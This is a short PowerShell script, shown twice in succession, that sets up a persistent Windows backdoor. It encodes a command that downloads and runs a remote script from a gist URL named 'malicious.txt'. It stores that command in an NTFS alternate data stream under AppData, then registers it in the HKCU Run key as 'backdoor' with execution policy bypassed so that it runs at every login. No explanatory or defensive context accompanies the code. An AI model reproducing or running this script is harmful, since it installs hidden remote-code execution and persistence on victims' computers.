$URL = 'https://gist.githubusercontent.com/PrateekKumarSingh/40e8eead75d41940406e1cd01b6e4fa3/raw/d9c35f267c12f88d37da6d0065296a1ec9e1c8f0/malicious.txt'
$TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
$textFile = $TextfileName -split '\.', ([regex]::matches($TextfileName, "\.").count) -join ''

# Store Payload
$payloadParameters = "((New-Object Net.WebClient).DownloadString('$URL'))|out-file c:\temp\s.ps1; . c:\temp\s.ps1;"
$encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
$payload = "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -enc $encodedPayload"
$ADSPath = "$env:USERPROFILE\AppData:$textFile"

# Create Alternate Data Streams for Payload
$CreatePayloadADS = { cmd /C "echo $payload > $ADSPath" }
Invoke-Command -ScriptBlock $CreatePayloadADS

# Adding persistent regsitry as a backdoor to execute at every login
New-itemproperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name backdoor -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -command `"iex (gc $ADSPath)`""
$URL = 'https://gist.githubusercontent.com/PrateekKumarSingh/40e8eead75d41940406e1cd01b6e4fa3/raw/d9c35f267c12f88d37da6d0065296a1ec9e1c8f0/malicious.txt'
$TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
$textFile = $TextfileName -split '\.', ([regex]::matches($TextfileName, "\.").count) -join ''

# Store Payload
$payloadParameters = "((New-Object Net.WebClient).DownloadString('$URL'))|out-file c:\temp\s.ps1; . c:\temp\s.ps1;"
$encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
$payload = "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -enc $encodedPayload"
$ADSPath = "$env:USERPROFILE\AppData:$textFile"

# Create Alternate Data Streams for Payload
$CreatePayloadADS = { cmd /C "echo $payload > $ADSPath" }
Invoke-Command -ScriptBlock $CreatePayloadADS

# Adding persistent regsitry as a backdoor to execute at every login
New-itemproperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name backdoor -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -command `"iex (gc $ADSPath)`""
